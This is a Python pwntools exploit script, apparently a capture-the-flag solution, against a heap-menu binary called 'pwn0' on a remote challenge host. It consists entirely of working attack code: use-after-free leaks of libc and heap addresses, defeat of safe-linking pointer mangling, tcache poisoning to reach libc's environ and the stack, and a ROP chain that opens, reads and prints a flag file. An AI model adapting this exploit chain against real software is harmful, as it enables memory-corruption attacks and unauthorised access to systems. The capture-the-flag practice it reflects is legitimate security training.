#!/usr/bin/env python
#coding=utf-8
from pwn import*

#io = process('./pwn0')
io = remote("172.16.30.216",58012)
elf = ELF('./pwn0')
libc = ELF('./libc.so.6')
context(log_level='debug',os='linux',arch='amd64')

def choice(c):
 io.recvuntil(":")
 io.sendline(str(c))

def add(size,content):
 choice(1)
 io.recvuntil(":")
 io.sendline(str(size))
 io.recvuntil(":")
 io.sendline(content)

def show(index):
 choice(3)
 io.recvuntil(":")
 io.sendline(str(index))

def edit(index,content):
 choice(4)
 io.recvuntil(":")
 io.sendline(str(index))
 io.recvuntil(":")
 io.send(content)

def free(index):
 choice(2)
 io.recvuntil(":")
 io.sendline(str(index))

add(0x420,'AAAAA')
add(0x400,'AAAAA')
add(0x400,'AAAAA')
add(0x400,'AAAAA')
add(0x400,'AAAAA')
add(0x400,'AAAAA')
free(0)
show(0)

leak = u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
libc_base = leak -96-0x20-224-20-204 - libc.sym['_IO_2_1_stdin_']
environ = libc_base + libc.sym['environ']

success(hex(leak))
success(hex(libc_base))

free(1)
show(1)

heap = u64(io.recv(5).ljust(8,b'\x00'))
heap = u64(io.recv(5).ljust(8,b'\x00'))
heap_base = (heap << 12 ) ^ 0
success(hex(heap_base))

edit(1,'A'*0x8)
show(1)
io.recvuntil("AAAAAAAA")
key = u64(io.recv(8))
success(hex(key))
edit(1,p64(heap))

free(2)
free(3)

tar_addr_heap = heap ^ (environ-0x10)
success(hex(tar_addr_heap))
edit(2,p64(tar_addr_heap))

add(0x30,'')
add(0x30,'')
add(0x30,'A'*15)
show(8)
stack = u64(io.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))

ret_addr_stack = stack - 0x150
success(hex(stack))


add(0x3ff,'AAAA')
add(0x3ff,'BBBB')
add(0x3ff,'CCCC')
add(0x3ff,'DDDD')

free(10)
free(11)
show(10)
leak = u64(io.recv(6).ljust(8,b'\x00'))
leak = u64(io.recv(6).ljust(8,b'\x00'))
success(hex(leak))

tar_heap = (heap_base + 0x1b10)>>12

tar_addr = tar_heap ^ (ret_addr_stack-8-0x10)
edit(11,p64(tar_addr))

add(0x30,'')


pop_rax = libc_base + 0x446b0
pop_rdx = libc_base + 0x106791
pop_rdi = libc_base + 0x2daa2
pop_rsi = libc_base + 0x37bfa
puts = libc_base+libc.sym['puts']
read = libc_base + libc.sym['read']
write = libc_base + libc.sym['write']
open_addr = libc_base + libc.sym['open']

libc_bss = libc_base + libc.bss()
flag = libc_bss

payload = p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(flag)+p64(pop_rdx)+p64(0x20) + p64(0) +p64(read)#read
payload += p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(open_addr)#open
payload += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(flag+0x10)+p64(pop_rdx)+p64(0x50) + p64(0) +p64(read)#read
payload += p64(pop_rdi)+p64(flag+0x10)+p64(puts)#write

add(0x30,b'A'*(8 + 0x10) + payload)
io.sendline('./flag\x00')

io.interactive()